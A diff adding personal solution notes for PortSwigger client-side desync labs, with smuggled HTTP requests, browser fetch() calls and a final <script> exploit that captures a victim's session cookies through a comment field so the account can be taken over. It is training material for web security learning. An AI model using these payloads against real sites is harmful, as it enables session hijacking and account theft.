@@ -96,8 +96,141 @@ Client-side desync  2 Lab
 
 https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
 
-1. 
-2. 
+# ***[1. Lab: Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)
+
+This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.
+
+To solve the lab:
+
+    Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.
+
+    Identify a gadget that enables you to store text data within the application.
+
+    Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
+
+    Use the stolen cookie to access the victim's account.
+
+solution:
+1. Identify a client-side desync vector in Burp
+**request1** in group send:
+```
+POST / HTTP/1.1
+Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+**request 2** in group send:
+```
+POST / HTTP/1.1
+Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+2. replicate in browser: in exploit server on incognito session, open devtool/console and write the request as a fetch command (the CORS is to prevent the /en redirection):
+```js
+fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+    credentials: 'include',
+}).catch(() => {
+        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
+        mode: 'no-cors',
+        credentials: 'include'
+    })
+})
+```
+
+3. Identify a gadget that enables you to store text data within the application: use the comment section by changing the order of the parameters (so comment will be at the end) and leave it empty:
+```
+csrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.clom&website=http://Abla.com&comment=
+```
+
+4. Combine these to craft an exploit
+
+**request 1**:
+```
+POST / HTTP/1.1
+Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
+Connection: keep-alive
+Content-Length: 554
+
+POST /en/post/comment HTTP/1.1
+Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
+Cookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R
+Content-Length: 160
+
+csrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.clom&website=http://Abla.com&comment=
+```
+
+**request 2**:
+```
+GET /capture-me HTTP/1.1
+Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
+
+
+```
+
+5. replicate in browser:
+```js
+fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
+        method: 'POST',
+        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net\r\nCookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R\r\nContent-Length: 1128\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.com&website=https://portswigger.net&comment=',
+        mode: 'cors',
+        credentials: 'include',
+    }).catch(() => {
+        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net/capture-me', {
+        mode: 'no-cors',
+        credentials: 'include'
+    })
+})
+```
+6. final payload in exploit to send to victim:
+```htm
+<script>
+fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
+        method: 'POST',
+        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net\r\nCookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R\r\nContent-Length: 1128\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.com&website=https://portswigger.net&comment=',
+        mode: 'cors',
+        credentials: 'include',
+    }).catch(() => {
+        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net/capture-me', {
+        mode: 'no-cors',
+        credentials: 'include'
+    })
+})
+</script>
+```
+7. check comment section to see extracted information - change the Fetch content length value until it includes all of the victims credentials:
+```
+test | 15 December 2022
+
+GET /capture-me HTTP/1.1 Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net Connection: keep-alive sec-ch-ua: sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.98 Safari/537.36 sec-ch-ua-platform: Accept: */* Sec-Fetch-Site: cross-site Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty Referer: https://exploit-0ae0004c03ab7374c215472001ab0065.exploit-server.net/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=DJjriCxtcfLHmjTrBDq730YNd2xUAPPI; secret=lqMu6fnfGeVwefRyznYrI06s20P1S7eW; session=8HVg9nVrLBu6aoyKlEw9zQLRWojb3vlU; _lab_analytics=bxfDqujwSLZuV1BnVlFs7eiaFellGjBCbtCKwZaWen4kRvaUmCcdHIEjDKBbiHB9ULUQpc9OKuEvu1IIDr4PAb7cce8HAsdkOYLTkBk4Ox1O7LYb8tlZqXuqG0meWH2r4gtNvNfNjVQTr3ZZArGoHrwbnDJ58TfwIgcAwx7yKgsfSIAju1MfhxdrEoKY6EGIU6UheyLQ3o6BeO89uLyQD34Jpm7Fharv5il0DDx3FeOIhaTr2qUVdgFR7QVK7y0
+```
+
+8. use credentials to impersonate the victim 
+
+# lab solved
+
+
+# [***2. Lab: Browser cache poisoning via client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync)
+
+ This lab is vulnerable to client-side desync attacks. You can exploit this to induce a victim's browser to poison its own cache.
+
+To solve the lab:
+
+    Identify a client-side desync vector in Burp, then confirm that you can trigger the desync from a browser.
+
+    Identify a gadget that enables you to trigger an open redirect.
+
+    Combine these to craft an exploit that causes the victim's browser to poison its cache with a malicious resource import that calls alert(document.cookie) from the context of the main lab domain.
+
+
+
 
 <span style="color:yellow;font-weight:700;font-size:30px">
 Pause-based desync:  1 Lab
